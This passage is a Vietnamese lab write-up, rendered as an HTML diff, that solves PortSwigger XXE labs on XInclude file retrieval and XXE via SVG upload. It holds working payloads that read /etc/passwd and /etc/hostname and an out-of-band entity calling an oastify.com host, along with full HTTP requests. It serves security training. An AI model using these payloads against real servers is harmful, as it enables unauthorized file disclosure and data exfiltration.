class="p">&gt;</span><span class="mf">1</span><span class="p">&lt;/</span><span class="nt">storeId</span><span class="p">&gt;&lt;/</span><span class="nt">stockCheck</span><span class="p">&gt;</span>
+</code></pre></div>
+</li>
+</ul>
+</li>
+<li>
+<p>Thực hiện gọi request trên, quan sát response trả về chứa nội dung file. Hoàn thành giải lab</p>
+<ul>
+<li>
+<p>POC</p>
+<p><img alt="image.png" src="image%2024.png" /></p>
+<p><img alt="image.png" src="image%2025.png" /></p>
+</li>
+</ul>
+</li>
+</ul>
+<h1 id="lab-exploiting-xinclude-to-retrieve-files"><strong>Lab: Exploiting XInclude to retrieve files</strong><a class="headerlink" href="#lab-exploiting-xinclude-to-retrieve-files" title="Permanent link">&para;</a></h1>
+<p><a href="https://portswigger.net/web-security/xxe/lab-xinclude-attack">Lab: Exploiting XInclude to retrieve files | Web Security Academy</a></p>
+<ul>
+<li>
+<p>Thực hiện chọn một sản phẩm bất kỳ. Điều hướng đến chức năng <code>Check stock</code></p>
+<p><img alt="image.png" src="image%2026.png" /></p>
+</li>
+<li>
+<p>Trong phần mềm Burpsuite, thực hiện bắt request gửi tới API <code>POST /product/stock</code> . Tại đây, thực hiện thay đổi param <code>productId</code> và quan sát thấy response trả về chứa thông báo lỗi và cả giá trị chúng ta thay đổi cho param <code>productId</code></p>
+<ul>
+<li>
+<p>Request</p>
+<div class="highlight"><pre><span></span><code><span class="nx">POST</span><span class="w"> </span><span class="o">/</span><span class="nx">product</span><span class="o">/</span><span class="nx">stock</span><span class="w"> </span><span class="nx">HTTP</span><span class="o">/</span><span class="mf">2</span>
+<span class="nx">Host</span><span class="o">:</span><span class="w"> </span><span class="mf">0</span><span class="nx">ac2008b04324780dcb84a790082005b</span><span class="p">.</span><span class="nx">web</span><span class="o">-</span><span class="nx">security</span><span class="o">-</span><span class="nx">academy</span><span class="p">.</span><span class="nx">net</span>
+<span class="nx">Cookie</span><span class="o">:</span><span class="w"> </span><span class="nx">session</span><span class="o">=</span><span class="nx">CutfG8nHbdI3uKdGlu7tfbZSbPo1wiGX</span>
+<span class="nx">User</span><span class="o">-</span><span class="nx">Agent</span><span class="o">:</span><span class="w"> </span><span class="nx">Mozilla</span><span class="o">/</span><span class="mf">5.0</span><span class="w"> </span><span class="p">(</span><span class="nx">X11</span><span class="p">;</span><span class="w"> </span><span class="nx">Ubuntu</span><span class="p">;</span><span class="w"> </span><span class="nx">Linux</span><span class="w"> </span><span class="nx">x86_64</span><span class="p">;</span><span class="w"> </span><span class="nx">rv</span><span class="o">:</span><span class="mf">149.0</span><span class="p">)</span><span class="w"> </span><span class="nx">Gecko</span><span class="o">/</span><span class="mf">20100101</span><span class="w"> </span><span class="nx">Firefox</span><span class="o">/</span><span class="mf">149.0</span>
+<span class="nx">Accept</span><span class="o">:</span><span class="w"> </span><span class="o">*</span><span class="err">/*</span>
+<span class="nx">Accept</span><span class="o">-</span><span class="nx">Language</span><span class="o">:</span><span class="w"> </span><span class="nx">en</span><span class="o">-</span><span class="nx">US</span><span class="p">,</span><span class="nx">en</span><span class="p">;</span><span class="nx">q</span><span class="o">=</span><span class="mf">0.9</span>
+<span class="nx">Accept</span><span class="o">-</span><span class="nx">Encoding</span><span class="o">:</span><span class="w"> </span><span class="nx">gzip</span><span class="p">,</span><span class="w"> </span><span class="nx">deflate</span><span class="p">,</span><span class="w"> </span><span class="nx">br</span>
+<span class="nx">Referer</span><span class="o">:</span><span class="w"> </span><span class="nx">https</span><span class="o">:</span><span class="c1">//0ac2008b04324780dcb84a790082005b.web-security-academy.net/product?productId=1</span>
+<span class="nx">Content</span><span class="o">-</span><span class="nx">Type</span><span class="o">:</span><span class="w"> </span><span class="nx">application</span><span class="o">/</span><span class="nx">x</span><span class="o">-</span><span class="nx">www</span><span class="o">-</span><span class="nx">form</span><span class="o">-</span><span class="nx">urlencoded</span>
+<span class="nx">Content</span><span class="o">-</span><span class="nx">Length</span><span class="o">:</span><span class="w"> </span><span class="mf">24</span>
+<span class="nx">Origin</span><span class="o">:</span><span class="w"> </span><span class="nx">https</span><span class="o">:</span><span class="c1">//0ac2008b04324780dcb84a790082005b.web-security-academy.net</span>
+<span class="nx">Sec</span><span class="o">-</span><span class="nx">Fetch</span><span class="o">-</span><span class="nx">Dest</span><span class="o">:</span><span class="w"> </span><span class="nx">empty</span>
+<span class="nx">Sec</span><span class="o">-</span><span class="nx">Fetch</span><span class="o">-</span><span class="nx">Mode</span><span class="o">:</span><span class="w"> </span><span class="nx">cors</span>
+<span class="nx">Sec</span><span class="o">-</span><span class="nx">Fetch</span><span class="o">-</span><span class="nx">Site</span><span class="o">:</span><span class="w"> </span><span class="nx">same</span><span class="o">-</span><span class="nx">origin</span>
+<span class="nx">Priority</span><span class="o">:</span><span class="w"> </span><span class="nx">u</span><span class="o">=</span><span class="mf">0</span>
+<span class="nx">Te</span><span class="o">:</span><span class="w"> </span><span class="nx">trailers</span>
+
+<span class="nx">productId</span><span class="o">=</span><span class="nx">aaaa</span><span class="o">&amp;</span><span class="nx">storeId</span><span class="o">=</span><span class="mf">1</span>
+</code></pre></div>
+</li>
+<li>
+<p>Response</p>
+<p><img alt="image.png" src="image%2027.png" /></p>
+</li>
+</ul>
+</li>
+<li>
+<p>Tuy nhiên thì ở đây, dữ liệu truyền vào có thể được đưa vào một xml file rồi parse sau đó ⇒ có xxe injection. Tuy nhiên, chúng ta không thể kiểm soát bằng cách khai báo thực thể (vì trường chúng ta đẩy vào một param của file nên nếu khai báo như vậy sẽ bị lỗi). Tuy vậy, vẫn còn một cách đó là dùng <code>XInclude</code> như sau:</p>
+<ul>
+<li>
+<p>Payload</p>
+<div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">foo</span><span class="w"> </span><span class="na">xmlns</span><span class="err">:</span><span class="na">xi</span><span class="o">=</span><span class="s">&quot;http://www.w3.org/2001/XInclude&quot;</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">xi</span><span class="err">:</span><span class="na">include</span><span class="w"> </span><span class="na">parse</span><span class="o">=</span><span class="s">&quot;text&quot;</span><span class="w"> </span><span class="na">href</span><span class="o">=</span><span class="s">&quot;file:///etc/passwd&quot;</span><span class="p">/&gt;&lt;/</span><span class="nt">foo</span><span class="p">&gt;</span>
+</code></pre></div>
+</li>
+<li>
+<p>Request</p>
+<div class="highlight"><pre><span></span><code><span class="nx">POST</span><span class="w"> </span><span class="o">/</span><span class="nx">product</span><span class="o">/</span><span class="nx">stock</span><span class="w"> </span><span class="nx">HTTP</span><span class="o">/</span><span class="mf">2</span>
+<span class="nx">Host</span><span class="o">:</span><span class="w"> </span><span class="mf">0</span><span class="nx">ac2008b04324780dcb84a790082005b</span><span class="p">.</span><span class="nx">web</span><span class="o">-</span><span class="nx">security</span><span class="o">-</span><span class="nx">academy</span><span class="p">.</span><span class="nx">net</span>
+<span class="nx">Cookie</span><span class="o">:</span><span class="w"> </span><span class="nx">session</span><span class="o">=</span><span class="nx">CutfG8nHbdI3uKdGlu7tfbZSbPo1wiGX</span>
+<span class="nx">User</span><span class="o">-</span><span class="nx">Agent</span><span class="o">:</span><span class="w"> </span><span class="nx">Mozilla</span><span class="o">/</span><span class="mf">5.0</span><span class="w"> </span><span class="p">(</span><span class="nx">X11</span><span class="p">;</span><span class="w"> </span><span class="nx">Ubuntu</span><span class="p">;</span><span class="w"> </span><span class="nx">Linux</span><span class="w"> </span><span class="nx">x86_64</span><span class="p">;</span><span class="w"> </span><span class="nx">rv</span><span class="o">:</span><span class="mf">149.0</span><span class="p">)</span><span class="w"> </span><span class="nx">Gecko</span><span class="o">/</span><span class="mf">20100101</span><span class="w"> </span><span class="nx">Firefox</span><span class="o">/</span><span class="mf">149.0</span>
+<span class="nx">Accept</span><span class="o">:</span><span class="w"> </span><span class="o">*</span><span class="err">/*</span>
+<span class="nx">Accept</span><span class="o">-</span><span class="nx">Language</span><span class="o">:</span><span class="w"> </span><span class="nx">en</span><span class="o">-</span><span class="nx">US</span><span class="p">,</span><span class="nx">en</span><span class="p">;</span><span class="nx">q</span><span class="o">=</span><span class="mf">0.9</span>
+<span class="nx">Accept</span><span class="o">-</span><span class="nx">Encoding</span><span class="o">:</span><span class="w"> </span><span class="nx">gzip</span><span class="p">,</span><span class="w"> </span><span class="nx">deflate</span><span class="p">,</span><span class="w"> </span><span class="nx">br</span>
+<span class="nx">Referer</span><span class="o">:</span><span class="w"> </span><span class="nx">https</span><span class="o">:</span><span class="c1">//0ac2008b04324780dcb84a790082005b.web-security-academy.net/product?productId=1</span>
+<span class="nx">Content</span><span class="o">-</span><span class="nx">Type</span><span class="o">:</span><span class="w"> </span><span class="nx">application</span><span class="o">/</span><span class="nx">x</span><span class="o">-</span><span class="nx">www</span><span class="o">-</span><span class="nx">form</span><span class="o">-</span><span class="nx">urlencoded</span>
+<span class="nx">Content</span><span class="o">-</span><span class="nx">Length</span><span class="o">:</span><span class="w"> </span><span class="mf">196</span>
+<span class="nx">Origin</span><span class="o">:</span><span class="w"> </span><span class="nx">https</span><span class="o">:</span><span class="c1">//0ac2008b04324780dcb84a790082005b.web-security-academy.net</span>
+<span class="nx">Sec</span><span class="o">-</span><span class="nx">Fetch</span><span class="o">-</span><span class="nx">Dest</span><span class="o">:</span><span class="w"> </span><span class="nx">empty</span>
+<span class="nx">Sec</span><span class="o">-</span><span class="nx">Fetch</span><span class="o">-</span><span class="nx">Mode</span><span class="o">:</span><span class="w"> </span><span class="nx">cors</span>
+<span class="nx">Sec</span><span class="o">-</span><span class="nx">Fetch</span><span class="o">-</span><span class="nx">Site</span><span class="o">:</span><span class="w"> </span><span class="nx">same</span><span class="o">-</span><span class="nx">origin</span>
+<span class="nx">Priority</span><span class="o">:</span><span class="w"> </span><span class="nx">u</span><span class="o">=</span><span class="mf">0</span>
+<span class="nx">Te</span><span class="o">:</span><span class="w"> </span><span class="nx">trailers</span>
+
+<span class="nx">productId</span><span class="o">=%</span><span class="mf">3</span><span class="nx">cfoo</span><span class="o">%</span><span class="mf">20</span><span class="nx">xmlns</span><span class="o">%</span><span class="mf">3</span><span class="nx">axi</span><span class="o">%</span><span class="mf">3</span><span class="nx">d</span><span class="o">%</span><span class="mf">22</span><span class="nx">http</span><span class="o">%</span><span class="mf">3</span><span class="nx">a</span><span class="o">%</span><span class="mf">2</span><span class="nx">f</span><span class="o">%</span><span class="mf">2</span><span class="nx">fwww</span><span class="p">.</span><span class="nx">w3</span><span class="p">.</span><span class="nx">org</span><span class="o">%</span><span class="mf">2</span><span class="nx">f2001</span><span class="o">%</span><span class="mf">2</span><span class="nx">fXInclude</span><span class="o">%</span><span class="mf">22</span><span class="o">%</span><span class="mf">3</span><span class="nx">e</span><span class="o">%</span><span class="mf">0</span><span class="nx">d</span><span class="o">%</span><span class="mf">0</span><span class="nx">a</span><span class="o">%</span><span class="mf">3</span><span class="nx">cxi</span><span class="o">%</span><span class="mf">3</span><span class="nx">ainclude</span><span class="o">%</span><span class="mf">20</span><span class="nx">parse</span><span class="o">%</span><span class="mf">3</span><span class="nx">d</span><span class="o">%</span><span class="mf">22</span><span class="nx">text</span><span class="o">%</span><span class="mf">22</span><span class="o">%</span><span class="mf">20</span><span class="nx">href</span><span class="o">%</span><span class="mf">3</span><span class="nx">d</span><span class="o">%</span><span class="mf">22</span><span class="nx">file</span><span class="o">%</span><span class="mf">3</span><span class="nx">a</span><span class="o">%</span><span class="mf">2</span><span class="nx">f</span><span class="o">%</span><span class="mf">2</span><span class="nx">f</span><span class="o">%</span><span class="mf">2</span><span class="nx">fetc</span><span class="o">%</span><span class="mf">2</span><span class="nx">fpasswd</span><span class="o">%</span><span class="mf">22</span><span class="o">%</span><span class="mf">2</span><span class="nx">f</span><span class="o">%</span><span class="mf">3</span><span class="nx">e</span><span class="o">%</span><span class="mf">3</span><span class="nx">c</span><span class="o">%</span><span class="mf">2</span><span class="nx">ffoo</span><span class="o">%</span><span class="mf">3</span><span class="nx">e</span><span class="o">&amp;</span><span class="nx">storeId</span><span class="o">=</span><span class="mf">1</span>
+</code></pre></div>
+</li>
+</ul>
+</li>
+<li>
+<p>Thực hiện gửi request trên, quan sát response trả về là nội dung file</p>
+<p><img alt="image.png" src="image%2028.png" /></p>
+</li>
+<li>
+<p>Hoàn thành giải lab</p>
+<p><img alt="image.png" src="image%2029.png" /></p>
+</li>
+</ul>
+<h1 id="lab-exploiting-xxe-via-image-file-upload"><strong>Lab: Exploiting XXE via image file upload</strong><a class="headerlink" href="#lab-exploiting-xxe-via-image-file-upload" title="Permanent link">&para;</a></h1>
+<p><a href="https://portswigger.net/web-security/xxe/lab-xxe-via-file-upload">Lab: Exploiting XXE via image file upload | Web Security Academy</a></p>
+<ul>
+<li>
+<p>Thực hiện chọn một sản phẩm bất kỳ. Điều hướng đến chức năng post comment. Tại đây, thực hiện upload ảnh.</p>
+<p><img alt="image.png" src="image%2030.png" /></p>
+</li>
+<li>
+<p>Ở đây, chúng ta có thể upload ảnh svg (có dạng xml) sau đó ảnh vẫn có thể hiển thị ⇒ có thể có trình parse xml. Chúng ta bổ sung thêm entity trigger oob vào body ảnh thì nhận thấy có thể trigger thành công.</p>
+<ul>
+<li>
+<p>Payload</p>
+<div class="highlight"><pre><span></span><code><span class="o">&lt;?</span><span class="nx">xml</span><span class="w"> </span><span class="nx">version</span><span class="o">=</span><span class="s2">&quot;1.0&quot;</span><span class="w"> </span><span class="nx">standalone</span><span class="o">=</span><span class="s2">&quot;no&quot;</span><span class="o">?&gt;</span>
+<span class="o">&lt;!</span><span class="nx">DOCTYPE</span><span class="w"> </span><span class="nx">foo</span><span class="w"> </span><span class="p">[</span><span class="w"> </span><span class="o">&lt;!</span><span class="nx">ENTITY</span><span class="w"> </span><span class="o">%</span><span class="w"> </span><span class="nx">xxe</span><span class="w"> </span><span class="nx">SYSTEM</span><span class="w"> </span><span class="s2">&quot;http://hg1tcmye5ar8giqcg76l5fg1fslj9b7zw.oastify.com&quot;</span><span class="o">&gt;</span><span class="w"> </span><span class="o">%</span><span class="nx">xxe</span><span class="p">;]</span><span class="o">&gt;</span>
+<span class="o">&lt;!</span><span class="nx">DOCTYPE</span><span class="w"> </span><span class="nx">svg</span><span class="w"> </span><span class="nx">PUBLIC</span><span class="w"> </span><span class="s2">&quot;-//W3C//DTD SVG 1.1//EN&quot;</span><span class="w"> </span><span class="s2">&quot;http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd&quot;</span><span class="o">&gt;</span>
+
+<span class="p">&lt;</span><span class="nt">svg</span><span class="w"> </span><span class="na">version</span><span class="o">=</span><span class="s">&quot;1.1&quot;</span><span class="w"> </span><span class="na">baseProfile</span><span class="o">=</span><span class="s">&quot;full&quot;</span><span class="w"> </span><span class="na">xmlns</span><span class="o">=</span><span class="s">&quot;http://www.w3.org/2000/svg&quot;</span><span class="p">&gt;</span>
+<span class="w">   </span><span class="p">&lt;</span><span class="nt">polygon</span><span class="w"> </span><span class="na">id</span><span class="o">=</span><span class="s">&quot;triangle&quot;</span><span class="w"> </span><span class="na">points</span><span class="o">=</span><span class="s">&quot;0,0 0,50 50,0&quot;</span><span class="w"> </span><span class="na">fill</span><span class="o">=</span><span class="s">&quot;#009900&quot;</span><span class="w"> </span><span class="na">stroke</span><span class="o">=</span><span class="s">&quot;#004400&quot;</span><span class="p">/&gt;</span>
+<span class="w">   </span><span class="p">&lt;</span><span class="nt">script</span><span class="w"> </span><span class="na">type</span><span class="o">=</span><span class="s">&quot;text/javascript&quot;</span><span class="p">&gt;</span>
+<span class="w">      </span><span class="nx">alert</span><span class="p">(</span><span class="nb">document</span><span class="p">.</span><span class="nx">domain</span><span class="p">);</span>
+<span class="w">   </span><span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+<span class="p">&lt;/</span><span class="nt">svg</span><span class="p">&gt;</span>
+</code></pre></div>
+</li>
+<li>
+<p>Request</p>
+<div class="highlight"><pre><span></span><code><span class="nx">POST</span><span class="w"> </span><span class="o">/</span><span class="nx">post</span><span class="o">/</span><span class="nx">comment</span><span class="w"> </span><span class="nx">HTTP</span><span class="o">/</span><span class="mf">2</span>
+<span class="nx">Host</span><span class="o">:</span><span class="w"> </span><span class="mf">0</span><span class="nx">ae700dd0486872281cafd4600ab00a1</span><span class="p">.</span><span class="nx">web</span><span class="o">-</span><span class="nx">security</span><span class="o">-</span><span class="nx">academy</span><span class="p">.</span><span class="nx">net</span>
+<span class="nx">Cookie</span><span class="o">:</span><span class="w"> </span><span class="nx">session</span><span class="o">=</span><span class="nx">MyWWuTmNZsLQg2vLDbyN82NtgKz8mbBR</span>
+<span class="nx">User</span><span class="o">-</span><span class="nx">Agent</span><span class="o">:</span><span class="w"> </span><span class="nx">Mozilla</span><span class="o">/</span><span class="mf">5.0</span><span class="w"> </span><span class="p">(</span><span class="nx">X11</span><span class="p">;</span><span class="w"> </span><span class="nx">Ubuntu</span><span class="p">;</span><span class="w"> </span><span class="nx">Linux</span><span class="w"> </span><span class="nx">x86_64</span><span class="p">;</span><span class="w"> </span><span class="nx">rv</span><span class="o">:</span><span class="mf">149.0</span><span class="p">)</span><span class="w"> </span><span class="nx">Gecko</span><span class="o">/</span><span class="mf">20100101</span><span class="w"> </span><span class="nx">Firefox</span><span class="o">/</span><span class="mf">149.0</span>
+<span class="nx">Accept</span><span class="o">:</span><span class="w"> </span><span class="nx">text</span><span class="o">/</span><span class="nx">html</span><span class="p">,</span><span class="nx">application</span><span class="o">/</span><span class="nx">xhtml</span><span class="o">+</span><span class="nx">xml</span><span class="p">,</span><span class="nx">application</span><span class="o">/</span><span class="nx">xml</span><span class="p">;</span><span class="nx">q</span><span class="o">=</span><span class="mf">0.9</span><span class="p">,</span><span class="o">*</span><span class="err">/*;q=0.8</span>
+<span class="nx">Accept</span><span class="o">-</span><span class="nx">Language</span><span class="o">:</span><span class="w"> </span><span class="nx">en</span><span class="o">-</span><span class="nx">US</span><span class="p">,</span><span class="nx">en</span><span class="p">;</span><span class="nx">q</span><span class="o">=</span><span class="mf">0.9</span>
+<span class="nx">Accept</span><span class="o">-</span><span class="nx">Encoding</span><span class="o">:</span><span class="w"> </span><span class="nx">gzip</span><span class="p">,</span><span class="w"> </span><span class="nx">deflate</span><span class="p">,</span><span class="w"> </span><span class="nx">br</span>
+<span class="nx">Content</span><span class="o">-</span><span class="nx">Type</span><span class="o">:</span><span class="w"> </span><span class="nx">multipart</span><span class="o">/</span><span class="nx">form</span><span class="o">-</span><span class="nx">data</span><span class="p">;</span><span class="w"> </span><span class="nx">boundary</span><span class="o">=----</span><span class="nx">geckoformboundary40294791d907d871ac79c3cebe3991e</span>
+<span class="nx">Content</span><span class="o">-</span><span class="nx">Length</span><span class="o">:</span><span class="w"> </span><span class="mf">1425</span>
+<span class="nx">Origin</span><span class="o">:</span><span class="w"> </span><span class="nx">https</span><span class="o">:</span><span class="c1">//0ae700dd0486872281cafd4600ab00a1.web-security-academy.net</span>
+<span class="nx">Referer</span><span class="o">:</span><span class="w"> </span><span class="nx">https</span><span class="o">:</span><span class="c1">//0ae700dd0486872281cafd4600ab00a1.web-security-academy.net/post?postId=5</span>
+<span class="nx">Upgrade</span><span class="o">-</span><span class="nx">Insecure</span><span class="o">-</span><span class="nx">Requests</span><span class="o">:</span><span class="w"> </span><span class="mf">1</span>
+<span class="nx">Sec</span><span class="o">-</span><span class="nx">Fetch</span><span class="o">-</span><span class="nx">Dest</span><span class="o">:</span><span class="w"> </span><span class="nb">document</span>
+<span class="nx">Sec</span><span class="o">-</span><span class="nx">Fetch</span><span class="o">-</span><span class="nx">Mode</span><span class="o">:</span><span class="w"> </span><span class="nx">navigate</span>
+<span class="nx">Sec</span><span class="o">-</span><span class="nx">Fetch</span><span class="o">-</span><span class="nx">Site</span><span class="o">:</span><span class="w"> </span><span class="nx">same</span><span class="o">-</span><span class="nx">origin</span>
+<span class="nx">Sec</span><span class="o">-</span><span class="nx">Fetch</span><span class="o">-</span><span class="nx">User</span><span class="o">:</span><span class="w"> </span><span class="o">?</span><span class="mf">1</span>
+<span class="nx">Priority</span><span class="o">:</span><span class="w"> </span><span class="nx">u</span><span class="o">=</span><span class="mf">0</span><span class="p">,</span><span class="w"> </span><span class="nx">i</span>
+<span class="nx">Te</span><span class="o">:</span><span class="w"> </span><span class="nx">trailers</span>
+
+<span class="o">------</span><span class="nx">geckoformboundary40294791d907d871ac79c3cebe3991e</span>
+<span class="nx">Content</span><span class="o">-</span><span class="nx">Disposition</span><span class="o">:</span><span class="w"> </span><span class="nx">form</span><span class="o">-</span><span class="nx">data</span><span class="p">;</span><span class="w"> </span><span class="nx">name</span><span class="o">=</span><span class="s2">&quot;csrf&quot;</span>
+
+<span class="nx">qAIevmCpcVt7Au1s3RSbN51kVv6ooAlO</span>
+<span class="o">------</span><span class="nx">geckoformboundary40294791d907d871ac79c3cebe3991e</span>
+<span class="nx">Content</span><span class="o">-</span><span class="nx">Disposition</span><span class="o">:</span><span class="w"> </span><span class="nx">form</span><span class="o">-</span><span class="nx">data</span><span class="p">;</span><span class="w"> </span><span class="nx">name</span><span class="o">=</span><span class="s2">&quot;postId&quot;</span>
+
+<span class="mf">5</span>
+<span class="o">------</span><span class="nx">geckoformboundary40294791d907d871ac79c3cebe3991e</span>
+<span class="nx">Content</span><span class="o">-</span><span class="nx">Disposition</span><span class="o">:</span><span class="w"> </span><span class="nx">form</span><span class="o">-</span><span class="nx">data</span><span class="p">;</span><span class="w"> </span><span class="nx">name</span><span class="o">=</span><span class="s2">&quot;comment&quot;</span>
+
+<span class="nx">hehe</span>
+<span class="o">------</span><span class="nx">geckoformboundary40294791d907d871ac79c3cebe3991e</span>
+<span class="nx">Content</span><span class="o">-</span><span class="nx">Disposition</span><span class="o">:</span><span class="w"> </span><span class="nx">form</span><span class="o">-</span><span class="nx">data</span><span class="p">;</span><span class="w"> </span><span class="nx">name</span><span class="o">=</span><span class="s2">&quot;name&quot;</span>
+
+<span class="nx">hehe</span>
+<span class="o">------</span><span class="nx">geckoformboundary40294791d907d871ac79c3cebe3991e</span>
+<span class="nx">Content</span><span class="o">-</span><span class="nx">Disposition</span><span class="o">:</span><span class="w"> </span><span class="nx">form</span><span class="o">-</span><span class="nx">data</span><span class="p">;</span><span class="w"> </span><span class="nx">name</span><span class="o">=</span><span class="s2">&quot;avatar&quot;</span><span class="p">;</span><span class="w"> </span><span class="nx">filename</span><span class="o">=</span><span class="s2">&quot;SVG_XSS_green_triangle.svg&quot;</span>
+<span class="nx">Content</span><span class="o">-</span><span class="nx">Type</span><span class="o">:</span><span class="w"> </span><span class="nx">image</span><span class="o">/</span><span class="nx">svg</span><span class="o">+</span><span class="nx">xml</span>
+
+<span class="o">&lt;?</span><span class="nx">xml</span><span class="w"> </span><span class="nx">version</span><span class="o">=</span><span class="s2">&quot;1.0&quot;</span><span class="w"> </span><span class="nx">standalone</span><span class="o">=</span><span class="s2">&quot;no&quot;</span><span class="o">?&gt;</span>
+<span class="o">&lt;!</span><span class="nx">DOCTYPE</span><span class="w"> </span><span class="nx">foo</span><span class="w"> </span><span class="p">[</span><span class="w"> </span><span class="o">&lt;!</span><span class="nx">ENTITY</span><span class="w"> </span><span class="o">%</span><span class="w"> </span><span class="nx">xxe</span><span class="w"> </span><span class="nx">SYSTEM</span><span class="w"> </span><span class="s2">&quot;http://hg1tcmye5ar8giqcg76l5fg1fslj9b7zw.oastify.com&quot;</span><span class="o">&gt;</span><span class="w"> </span><span class="o">%</span><span class="nx">xxe</span><span class="p">;]</span><span class="o">&gt;</span>
+<span class="p">&lt;</span><span class="nt">svg</span><span class="w"> </span><span class="na">version</span><span class="o">=</span><span class="s">&quot;1.1&quot;</span><span class="w"> </span><span class="na">baseProfile</span><span class="o">=</span><span class="s">&quot;full&quot;</span><span class="w"> </span><span class="na">xmlns</span><span class="o">=</span><span class="s">&quot;http://www.w3.org/2000/svg&quot;</span><span class="p">&gt;</span>
+<span class="w">   </span><span class="p">&lt;</span><span class="nt">polygon</span><span class="w"> </span><span class="na">id</span><span class="o">=</span><span class="s">&quot;triangle&quot;</span><span class="w"> </span><span class="na">points</span><span class="o">=</span><span class="s">&quot;0,0 0,50 50,0&quot;</span><span class="w"> </span><span class="na">fill</span><span class="o">=</span><span class="s">&quot;#009900&quot;</span><span class="w"> </span><span class="na">stroke</span><span class="o">=</span><span class="s">&quot;#004400&quot;</span><span class="p">/&gt;</span>
+<span class="w">   </span><span class="p">&lt;</span><span class="nt">script</span><span class="w"> </span><span class="na">type</span><span class="o">=</span><span class="s">&quot;text/javascript&quot;</span><span class="p">&gt;</span>
+<span class="w">      </span><span class="nx">alert</span><span class="p">(</span><span class="nb">document</span><span class="p">.</span><span class="nx">domain</span><span class="p">);</span>
+<span class="w">   </span><span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+<span class="p">&lt;/</span><span class="nt">svg</span><span class="p">&gt;</span>
+<span class="o">------</span><span class="nx">geckoformboundary40294791d907d871ac79c3cebe3991e</span>
+<span class="nx">Content</span><span class="o">-</span><span class="nx">Disposition</span><span class="o">:</span><span class="w"> </span><span class="nx">form</span><span class="o">-</span><span class="nx">data</span><span class="p">;</span><span class="w"> </span><span class="nx">name</span><span class="o">=</span><span class="s2">&quot;email&quot;</span>
+
+<span class="nx">a</span><span class="err">@</span><span class="nx">ginandjuice</span><span class="p">.</span><span class="nx">shop</span>
+<span class="o">------</span><span class="nx">geckoformboundary40294791d907d871ac79c3cebe3991e</span>
+<span class="nx">Content</span><span class="o">-</span><span class="nx">Disposition</span><span class="o">:</span><span class="w"> </span><span class="nx">form</span><span class="o">-</span><span class="nx">data</span><span class="p">;</span><span class="w"> </span><span class="nx">name</span><span class="o">=</span><span class="s2">&quot;website&quot;</span>
+
+<span class="nx">http</span><span class="o">:</span><span class="c1">//a.com</span>
+<span class="o">------</span><span class="nx">geckoformboundary40294791d907d871ac79c3cebe3991e</span><span class="o">--</span>
+</code></pre></div>
+</li>
+<li>
+<p>Response</p>
+<p><img alt="image.png" src="image%2031.png" /></p>
+</li>
+</ul>
+</li>
+<li>
+<p>Thực hiện đọc file bất kỳ như sau</p>
+<ul>
+<li>
+<p>Payload</p>
+<div class="highlight"><pre><span></span><code><span class="o">&lt;?</span><span class="nx">xml</span><span class="w"> </span><span class="nx">version</span><span class="o">=</span><span class="s2">&quot;1.0&quot;</span><span class="w"> </span><span class="nx">standalone</span><span class="o">=</span><span class="s2">&quot;no&quot;</span><span class="o">?&gt;</span>
+<span class="o">&lt;!</span><span class="nx">DOCTYPE</span><span class="w"> </span><span class="nx">foo</span><span class="w"> </span><span class="p">[</span><span class="w"> </span><span class="o">&lt;!</span><span class="nx">ENTITY</span><span class="w"> </span><span class="nx">xxe</span><span class="w"> </span><span class="nx">SYSTEM</span><span class="w"> </span><span class="s2">&quot;file:///etc/hostname&quot;</span><span class="o">&gt;</span><span class="w"> </span><span class="p">]</span><span class="o">&gt;</span>
+
+<span class="p">&lt;</span><span class="nt">svg</span><span class="w"> </span><span class="na">width</span><span class="o">=</span><span class="s">&quot;200&quot;</span><span class="w"> </span><span class="na">height</span><span class="o">=</span><span class="s">&quot;60&quot;</span><span class="w"> </span><span class="na">xmlns</span><span class="o">=</span><span class="s">&quot;http://www.w3.org/2000/svg&quot;</span><span class="p">&gt;</span>
+<span class="w">  </span><span class="p">&lt;</span><span class="nt">text</span><span class="w"> </span><span class="na">x</span><span class="o">=</span><span class="s">&quot;10&quot;</span><span class="w"> </span><span class="na">y</span><span class="o">=</span><span class="s">&quot;40&quot;</span><span class="w"> </span><span class="na">font-family</span><span class="o">=</span><span class="s">&quot;Arial&quot;</span><span class="w"> </span><span class="na">font-size</span><span class="o">=</span><span class="s">&quot;24&quot;</span><span class="w"> </span><span class="na">fill</span><span class="o">=</span><span class="s">&quot;blue&quot;</span><span class="p">&gt;</span>
+<span class="w">    </span><span class="o">&amp;</span><span class="nx">xxe</span><span class="p">;</span>
+<span class="w">  </span><span class="p">&lt;/</span><span class="nt">text</span><span class="p">&gt;</span>
+<span class="p">&lt;/</span><span class="nt">svg</span><span class="p">&gt;</span>
+</code></pre></div>
+</li>
+<li>
+<p>Request</p>
+<div class="highlight"><pre><span></span><code><span class="nx">POST</span><span class="w"> </span><span class="o">/</span><span class="nx">post</span><span class="o">/</span><span class="nx">comment</span><span class="w"> </span><span class="nx">HTTP</span><span class="o">/</span><span class="mf">2</span>
+<span class="nx">Host</span><span class="o">:</span><span class="w"> </span><span class="mf">0</span><span class="nx">ae700dd0486872281cafd4600ab00a1</span><span class="p">.</span><span class="nx">web</span><span class="o">-</span><span class="nx">security</span><span class="o">-</span><span class="nx">academy</span><span class="p">.</span><span class="nx">net</span>
+<span class="nx">Cookie</span><span class="o">:</span><span class="w"> </span><span class="nx">session</span><span class="o">=</span><span class="nx">MyWWuTmNZsLQg2vLDbyN82NtgKz8mbBR</span>
+<span class="nx">User</span><span class="o">-</span><span class="nx">Agent</span><span class="o">:</span><span class="w"> </span><span class="nx">Mozilla</span><span class="o">/</span><span class="mf">5.0</span><span class="w"> </span><span class="p">(</span><span class="nx">X11</span><span class="p">;</span><span class="w"> </span><span class="nx">Ubuntu</span><span class="p">;</span><span class="w"> </span><span class="nx">Linux</span><span class="w"> </span><span class="nx">x86_64</span><span class="p">;</span><span class="w"> </span><span class="nx">rv</span><span class="o">:</span><span class="mf">149.0</span><span class="p">)</span><span class="w"> </span><span class="nx">Gecko</span><span class="o">/</span><span class="mf">20100101</span><span class="w"> </span><span class="nx">Firefox</span><span class="o">/</span><span class="mf">149.0</span>
